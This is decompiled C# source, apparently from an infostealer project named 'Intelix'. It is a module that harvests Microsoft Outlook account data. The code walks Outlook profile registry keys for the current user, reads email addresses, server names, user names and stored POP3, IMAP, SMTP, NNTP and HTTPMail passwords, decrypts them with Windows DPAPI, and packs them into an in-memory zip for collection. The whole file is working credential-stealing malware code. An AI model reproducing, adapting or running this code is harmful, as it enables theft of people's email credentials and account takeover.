using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Microsoft.Win32;

namespace Intelix.Targets.Messangers
{
	// Token: 0x0200001C RID: 28
	public class Outlook : ITarget
	{
		// Token: 0x06000051 RID: 81 RVA: 0x00003D98 File Offset: 0x00001F98
		public void Collect(InMemoryZip zip, Counter counter)
		{
			StringBuilder stringBuilder = new StringBuilder();
			string[] registryRoots = Outlook.RegistryRoots;
			foreach (string rootPath in registryRoots)
			{
				stringBuilder.Append(this.ReadRegistryTree(rootPath));
			}
			bool flag = stringBuilder.Length != 0;
			if (flag)
			{
				string text = Path.Combine("Outlook", "Outlook.txt");
				zip.AddTextFile(text, stringBuilder.ToString());
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Outlook";
				registryRoots = Outlook.RegistryRoots;
				foreach (string str in registryRoots)
				{
					counterApplications.Files.Add(str + " => " + text);
				}
				counterApplications.Files.Add(text);
				counter.Applications.Add(counterApplications);
			}
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003E80 File Offset: 0x00002080
		private string ReadRegistryTree(string rootPath)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Stack<string> stack = new Stack<string>();
			stack.Push(rootPath);
			while (stack.Count > 0)
			{
				string text = stack.Pop();
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, false))
				{
					bool flag = registryKey == null;
					if (!flag)
					{
						string[] array = Outlook.KeysToCheck;
						foreach (string text2 in array)
						{
							object value = registryKey.GetValue(text2);
							bool flag2 = value != null;
							if (flag2)
							{
								string value2 = this.FormatValue(text2, value);
								bool flag3 = !string.IsNullOrEmpty(value2);
								if (flag3)
								{
									stringBuilder.AppendLine(value2);
								}
							}
						}
						array = registryKey.GetSubKeyNames();
						foreach (string path in array)
						{
							try
							{
								stack.Push(Path.Combine(text, path));
							}
							catch
							{
							}
						}
					}
				}
			}
			bool flag4 = stringBuilder.Length > 0;
			if (flag4)
			{
				stringBuilder.AppendLine();
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00003FD4 File Offset: 0x000021D4
		private string FormatValue(string valueName, object raw)
		{
			byte[] array = raw as byte[];
			bool flag = array != null;
			string result;
			if (flag)
			{
				string text = Outlook.DecryptValue(array);
				bool flag2 = !string.IsNullOrEmpty(text);
				if (flag2)
				{
					result = valueName + ": " + text;
				}
				else
				{
					try
					{
						string text2 = Encoding.UTF8.GetString(array).Replace("\0", "");
						bool flag3 = !string.IsNullOrWhiteSpace(text2);
						if (flag3)
						{
							return valueName + ": " + text2;
						}
					}
					catch
					{
					}
					result = null;
				}
			}
			else
			{
				string text3 = raw.ToString();
				bool flag4 = string.IsNullOrWhiteSpace(text3);
				if (flag4)
				{
					result = null;
				}
				else
				{
					bool flag5 = !Outlook.HostnameRx.IsMatch(text3);
					if (flag5)
					{
						Outlook.MailAddressRx.IsMatch(text3);
					}
					result = valueName + ": " + text3;
				}
			}
			return result;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000040C8 File Offset: 0x000022C8
		private static string DecryptValue(byte[] encrypted)
		{
			bool flag = encrypted == null || encrypted.Length <= 1;
			string result;
			if (flag)
			{
				result = null;
			}
			else
			{
				try
				{
					byte[] array = new byte[encrypted.Length - 1];
					Buffer.BlockCopy(encrypted, 1, array, 0, array.Length);
					byte[] array2 = DpApi.Decrypt(array);
					bool flag2 = array2 == null || array2.Length == 0;
					if (flag2)
					{
						result = null;
					}
					else
					{
						result = Encoding.UTF8.GetString(array2).TrimEnd(new char[1]);
					}
				}
				catch
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x04000004 RID: 4
		private static readonly Regex MailAddressRx = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$", RegexOptions.Compiled);

		// Token: 0x04000005 RID: 5
		private static readonly Regex HostnameRx = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$", RegexOptions.Compiled);

		// Token: 0x04000006 RID: 6
		private static readonly string[] RegistryRoots = new string[]
		{
			"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
			"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
			"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
			"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
		};

		// Token: 0x04000007 RID: 7
		private static readonly string[] KeysToCheck = new string[]
		{
			"SMTP Email Address",
			"SMTP Server",
			"POP3 Server",
			"POP3 User Name",
			"SMTP User Name",
			"NNTP Email Address",
			"NNTP User Name",
			"NNTP Server",
			"IMAP Server",
			"IMAP User Name",
			"Email",
			"HTTP User",
			"HTTP Server URL",
			"POP3 User",
			"IMAP User",
			"HTTPMail User Name",
			"HTTPMail Server",
			"SMTP User",
			"POP3 Password2",
			"IMAP Password2",
			"NNTP Password2",
			"HTTPMail Password2",
			"SMTP Password2",
			"POP3 Password",
			"IMAP Password",
			"NNTP Password",
			"HTTPMail Password",
			"SMTP Password"
		};
	}
}
